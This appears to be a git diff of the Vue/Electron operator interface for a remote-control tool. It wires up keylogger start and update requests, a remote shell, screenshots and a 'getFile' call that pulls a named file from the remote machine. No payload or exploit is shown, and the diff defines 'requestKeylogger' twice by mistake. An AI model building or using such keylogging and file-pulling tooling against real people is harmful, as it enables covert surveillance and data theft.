@@ -117,7 +117,7 @@ export default {
         this.getScreenShot()
       }
       if (this.menus[index] === '文件目录') {
-        this.requestFilePreview()
+        this.getFile('/', 'lmy.txt')
       }
       if (this.menus[index] === '断开连接') {
         // todo 断开连接
@@ -167,14 +167,24 @@ export default {
       ipcRenderer.send('requestShell', 'stop')
     },
     /**
+     * @description: 请求键盘监控开始
+     * @return {string} stream 
+     */
+    requestKeylogger () {
+      ipcRenderer.once('keyloggerStart', (event, stream) => {
+        alert('Vue:' + stream)
+      })
+      ipcRenderer.send('requestKeylogger', 'start')
+    },
+    /**
      * @description: 请求键盘更新
      * @return {string} stream 新增的键盘输入
      */
     requestKeylogger () {
-      ipcRenderer.once('updateKeylogger', (event, stream) => {
+      ipcRenderer.once('KeyloggerUpdate', (event, stream) => {
         alert('Vue:' + stream)
       })
-      ipcRenderer.send('requestKeylogger', 'start')
+      ipcRenderer.send('requestKeylogger', 'update')
     },
     /**
      * @description: 断开键盘更新
@@ -210,11 +220,11 @@ export default {
      * @description: 获取文件
      * @return {string} url 文件保存路径
      */
-    getFile (path) {
+    getFile (path, fileName) {
       ipcRenderer.once('transfile', (event, url) => {
         alert('文件保存在' + url)
       })
-      ipcRenderer.send('requestFile', path)
+      ipcRenderer.send('requestFile', path, fileName)
     },
     /**
      * @description: 求取文件预览目录
